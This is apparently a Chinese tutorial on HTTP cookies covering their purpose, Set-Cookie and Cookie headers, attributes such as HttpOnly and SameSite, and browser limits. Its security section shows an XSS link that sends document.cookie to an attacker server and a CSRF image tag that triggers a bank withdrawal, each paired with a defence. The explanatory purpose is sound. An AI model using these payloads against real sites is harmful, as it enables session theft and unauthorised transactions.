## 1. 什么是cookie，为什么需要它？
   + 简单来说——cookie是客户端存储数据的其中一种方式。 
   + 为什么需要——因为http是无状态协议，一旦客户端和服务器的数据交换完毕，就会断开连接，再次请求，会重新连接，也就是说服务器单从网络连接上是无法知道用户身份的。
而Cookie就是为了解决这个问题，`识别用户`和`记录状态`。
     
## 2. cookie的作用是什么？
    上面第一点又讲了，Cookie的作用就是`识别用户`和`记录状态`
    MDN上面给出了三个目的，异曲同工
    + 会话管理：登录名，购物车，游戏得分或服务器应记住的其他内容
    + 个性化： 用户首选项，主题和其他设置
    + 追踪： 记录和分析用户行为

## 3. 前端cookie怎么与后端进行关联？
    + 服务器：收到http请求后，服务器发送一个或多个`Set-Cookie`标头以及响应。
    ```
        HTTP/2.0 200 OK
        Content-Type: text/html
        Set-Cookie: yummy_cookie=choco
        Set-Cookie: tasty_cookie=strawberry
        //这一段报文，告知客户端存储这两个cookie
    ```
    + 客户端：存储cookie，然后将cookie与在`Cookie`的HTTP标头中的请求发送到同一服务器。
    ```
        GET /sample_page.html HTTP/2.0
        Host: www.example.org
        Cookie: yummy_cookie=choco; tasty_cookie=strawberry
        //这一段报文，在对服务器的每个后续请求中，浏览器使用`Cookie`标头将所有先前存储的cookie发送回服务器。
    ```
## 4. cookie的构成
    + 名称 name
    > cookie名称是不区分大小写的。但是实践中最好还是将cookie名称看做是区分大小写。
    + 值 value
    > 存储在cookie中的字符串值。值必须被URL编码
    + 域 domain
    > cookie对于哪个域是有效的。所有向该域发送的请求中都会包含这个cookie信息。如果没有明确设定，那么这个域会被认为是来自设置cookie的那个域
    + 路径 path
    > 对于指定域中的那个路径，应该向服务器发送cookie。例如，可以指定cookie只有从 http://baidu.com/image/中才能访问，那么http://baidu.com的页面就不会发送cookie信息。即使请求都是来自同一个域。
    + 失效时间 expires
    > 表示 cookie 合适应该被删除的时间戳。默认情况下，浏览器回话结束时就将所有cookie删除，不过可以设置删除时间。这个值是个GMT格式的日期（Wdy,DD-Mon-YYYY HH:MM:SS GMT）..
    + 安全标志 secure
    > 指定后，cookie只有在使用SSL连接的时候才会发送到服务器。
    + HttpOnly
    > 指定后，通常从web页面内还可以对Cookit进行读取操作，但使用JavaScript的document.cookie就无法读取附加HttpOnly属性后的Cookie内容。因此，可以防止跨站脚本攻击（Cross-Site Scripting, XSS）。
    + SameSite
    > 该SameSite 属性使服务器可以指定是否/何时使用跨域请求发送cookie（其中站点由可注册域定义），从而为跨站点请求伪造攻击（CSRF）提供了一些保护
    它有三个可能的值：Strict，Lax，和None。
    使用Strict，Cookie仅发送到与它起源的站点相同的站点；
    Lax相似，不同之处在于cookie是在用户导航到cookie的原始站点时发送的，例如通过跟踪外部站点的链接发送的；
    None 指定在发起请求和跨站点请求上都发送cookie，但仅在安全上下文中发送 （即，如果还必须设置SameSite=None该Secure属性）。如果未SameSite设置任何属性，则cookie被视为Lax。
## 5. cookie怎么使用
    核心就一个，`document.cookie`，既可以是获取，也可以是设置，笑死~~~
    需要注意的就是所有的名字和值都是经过URL编码的，所以必须使用decodeURIComponent()来解码，当然在设置的时候，要用encodeURIComponent()来编码。
## 6. cookie安全性问题
    + 网络窃听
        网络上的流量可以被网络上任何计算机拦截，特别是未加密的开放式WIFI。这种流量包含在普通的未加密的HTTP清求上发送Cookie。在未加密的情况下，攻击者可以读取网络上的其他用户的信息，包含HTTP Cookie的全部内容，以便进行中间的攻击。比如：拦截cookie来冒充用户身份执行恶意任务（银行转账等）。
        解决办法：服务器可以设置secure属性的cookie，这样就只能通过https的方式来发送cookies了。
    + DNS缓存中毒
        如果攻击者可以使DNS缓存中毒，那么攻击者就可以访问用户的Cookie了，例如：攻击者使用DNS中毒来创建一个虚拟的NDS服务http://h123456.www.demo.com指向攻击者服务器的ip地址。然后攻击者可以从服务器 http://h123456.www.demo.com/img_01.png 发布图片。用户访问这个图片，由于 http://www.demo.com和http://h123456.www.demo.com是同一个子域，所以浏览器会把用户的与http://www.demo.com相关的cookie都会发送到http://h123456.www.demo.com这个服务器上，这样攻击者就会拿到用户的cookie搞事情。
        一般情况下是不会发生这种情况，通常是网络供应商错误。
    + 跨站点脚本XSS
        使用跨站点脚本技术可以窃取cookie。当网站允许使用javascript操作cookie的时候，就会发生攻击者发布恶意代码攻击用户的会话，同时可以拿到用户的cookie信息。
        ```html
            <a href="#" onclick=`window.location=http://abc.com?cookie=${docuemnt.cookie}`>领取红包</a> 
        ```
        当用户点击这个链接的时候，浏览器就会执行onclick里面的代码，结果这个网站用户的cookie信息就会被发送到http://abc.com攻击者的服务器。攻击者同样可以拿cookie搞事情。
        解决办法：可以通过cookie的HttpOnly属性，设置了HttpOnly属性，javascript代码将不能操作cookie。
    + 跨站请求伪造CSRF
        例如，SanShao可能正在浏览其他用户XiaoMing发布消息的聊天论坛。假设XiaoMing制作了一个引用ShanShao银行网站的HTML图像元素，例如，
        ```html
        <img src = "http://www.bank.com/withdraw?user=SanShao&amount=999999&for=XiaoMing" > 
        ```
        如果SanShao的银行将其认证信息保存在cookie中，并且cookie尚未过期，(当然是没有其他验证身份的东西)，那么SanShao的浏览器尝试加载该图片将使用他的cookie提交提款表单，从而在未经SanShao批准的情况下授权交易。
        解决办法：增加其他信息的校验（手机验证码，或者其他盾牌）。
        
## 7. cookie的限制
    + cookie 在性质上是绑定在特定的域名虾米昂的。当设定了一个cookie后，再给创建它的域名发送请求时，都会包含这个cookie。这个限制确保了储存在cookie中的信息只能让批准的接受者访问。而无法被其他域访问
    + cookie数量的限制
      > ie6以及更低版本限制每个域名最多20个cookie
      > ie7,firefox限制每个域名最多50个cookie
      > Opera限制每个域名最多30个cookie
      > Safari 和 Chrome 对于每个域的cookie数量限制没有硬性规定
    + cookie长度限制
      > 大多数浏览器都有大约4095B（加减1）的长度限制。
## 8. 第三方cookie

>参考文章
+ https://zhuanlan.zhihu.com/p/31852168
+ https://zhuanlan.zhihu.com/p/58666986

